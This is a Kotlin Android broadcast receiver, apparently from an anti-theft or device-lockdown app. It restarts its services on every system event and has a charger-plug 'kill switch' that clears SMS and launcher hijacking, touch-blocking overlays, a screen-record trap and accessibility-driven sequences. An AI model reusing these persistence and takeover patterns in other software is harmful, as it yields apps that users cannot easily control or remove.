package com.example.myandroid

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class SystemEventReceiver : BroadcastReceiver() {
    
    companion object {
        private val plugTimes = mutableListOf<Long>()
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        // --- HARDWARE KILL SWITCH (ESCAPE HATCH) ---
        if (action == Intent.ACTION_POWER_CONNECTED) {
            val now = System.currentTimeMillis()
            plugTimes.add(now)
            plugTimes.removeAll { now - it > 10000 } // Keep events within the last 10 seconds
            
            if (plugTimes.size >= 3) {
                DebugLogger.log("FAILSAFE", "HARDWARE KILL SWITCH TRIGGERED! (3 plugs in 10s)")
                executeKillSwitch(context)
                plugTimes.clear()
            }
        }

        if (action == android.telephony.TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
            val state = intent.getStringExtra(android.telephony.TelephonyManager.EXTRA_STATE)
            DebugLogger.log("TELEPHONY_WAKE", "Call state changed to: $state. Shocking service.")
        } else if (action == "android.intent.action.SIM_STATE_CHANGED") {
            DebugLogger.log("SIM_STATE", "SIM state change detected. Evaluating Trackers.")
            JudasManager.evaluateSimState(context)
            JudasManager.checkPendingStolenAlert(context)
        } else {
            DebugLogger.log("SYSTEM_EVENT", "Triggered by: $action")
        }

        // THE DEFIBRILLATOR LOGIC
        ServiceResurrector.shock(context)
        KeepAliveReceiver.scheduleNext(context)
        JudasManager.evaluateSimState(context)
    }

    private fun executeKillSwitch(ctx: Context) {
        // 1. Lift Ignition Lock
        DimmerManager.IgnitionManager.clearAll(ctx)
        
        // 2. Clear Hijack Flags
        DefaultSmsManager.expectedMode = ""
        DefaultSmsManager.isRelentlessActive = false
        LauncherManager.isHijacking = false
        ScreenRecordManager.isPatternTrap = false
        
        // 3. Purge UIs and Traps
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            DynamicUIManager.removeOverlay(ctx, "FAILSAFE_TRIGGERED")
            DynamicUIManager.removeNativeOverlay(ctx, "FAILSAFE_TRIGGERED")
            DynamicUIManager.removeTouchGuard(ctx)
            DynamicUIManager.removeStatusBarOverlay(ctx)
            
            // 4. Restore Display Hardware
            DimmerManager.applyDim(ctx, 100, "HARDWARE")
            DimmerManager.removeOverlay(ctx)
            
            // 5. Abort Active ACC Sequences
            MyAccessibilityService.instance?.abortSequences()
            
            // 6. Force UI to Home
            MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
        }
    }
}